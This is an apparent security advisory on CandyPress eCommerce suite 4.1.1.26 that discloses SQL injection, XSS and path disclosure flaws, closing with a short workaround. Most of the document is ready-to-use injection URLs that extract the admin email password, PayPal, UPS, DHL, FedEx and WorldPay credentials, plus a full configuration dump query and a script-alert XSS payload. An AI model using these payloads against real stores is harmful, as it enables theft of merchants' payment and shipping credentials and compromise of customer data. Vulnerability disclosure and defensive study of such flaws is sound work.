CandyPress eCommerce suite 4.1.1.26 Multiple Remote Vulnerabilities
===================================================================





#      AmnPardaz Security Research & Penetration Testing Group
#
# Title: [CandyPress] eCommerce suite
# Bugs: SQL Injection + XSS + Path Disclosure in CandyPress
# Vulnerable Version: 4.1.1.26
# Exploit: Available
# Fix Available: Yes!, Update to 4.1.1.27 (There is a fast solution too)
###################################################################################

####################
- Description:
####################
The CandyPress eCommerce suite acts as the command center of your online store. Powerful and versatile, yet easy to use and intuitive, it enables you to easily manage and administrate your orders, product catalog, shipping rates, locations, product reviews, customers and much more.

####################
- Vulnerability:
####################
Remote user can see all databases fields (there are a lot of encrypted credit cards), also there are XSS and Path Disclosure bugs too.

POC:
----
Find Version:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;storeVersion&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
Local Setup IP:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;excludeIP&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
Admin Email:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;pEmailAdmin&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
Admin Email Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;pEmailAdminPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
Direct Username:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppDirectUserName&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
Direct Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppDirectPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
Direct Signature:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppDirectSignature&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
pp Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
ppUsername:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppUserName&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
ppSignature:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;ppSignature&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
UPS UserID:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;UPSUserID&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
UPS Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;UPSPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
UPS Access ID:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;UPSAccessID&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
PayPal ... Login:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;VeriSignLogin&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
PayPal ... Partner:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;VeriSignPartner&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
PayPal ... Passowrd:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;VeriSignPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
WorldPay Call Back Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;WorldPayCallbackPW&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
WorldPay SID:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;WorldPayOutSID&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
DHL Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;DHLPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
DHL UserID:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;DHLUserID&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
Fedex Password:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;FEDEXPassword&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
Fedex UserID:
http://[CandyPressURL]/ajax/ajax_optInventory.asp?idProduct=-1%20or%201=1&options=&#039;%20union%20select%20configVal%20as%20inventory%20from%20storeAdmin%20where%20configVar=&#039;FEDEXUserID&#039;%20or%20&#039;2&#039;=&#039;1&action=get&inventory=1
----
Admin Email Password:
http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1&#039;)%20union%20select%20configVar%20as%20configHelp%20from%20storeAdmin%20where%20(&#039;1&#039;=&#039;1
http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1&#039;)%20union%20select%20configVal%20as%20configHelp%20from%20storeAdmin%20where%20configVar=&#039;pEmailAdmin&#039;%20or%20(&#039;1&#039;=&#039;2
http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1&#039;)%20union%20select%20configVal%20as%20configHelp%20from%20storeAdmin%20where%20configVar=&#039;pEmailAdminPassword&#039;%20or%20(&#039;1&#039;=&#039;2
http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=-1&#039;)%20union%20select%20configVar%20as%20configHelp%20from%20storeAdmin%20where%20(&#039;1&#039;=&#039;1
----
Full data disclosure:
http://[CandyPressURL]/ajax/ajax_getBrands.asp?recid=1%20or%201=1%20union%20select%20configVal,configVar%20from%20storeAdmin
----
Path Disclosure:
http://[CandyPressURL]/admin/SA_shipFedExMeter.asp?FedExAccount=admin
---
XSS Bug:
http://[CandyPressURL]/admin/utilities_ConfigHelp.asp?helpfield=%3Cscript%3Ealert(&#039;BugReport.IR from amnpardaz&#039;)%3C/script%3E

####################
- Fast Solution :
####################
1- Rename "/Admin" and "/Ajax" directories.
2- Rename (or delete) dangerous files which are:
	/ajax/ajax_optInventory.asp
	/ajax/ajax_getBrands.asp
	/admin/utilities_ConfigHelp.asp
	/admin/SA_shipFedExMeter.asp
	


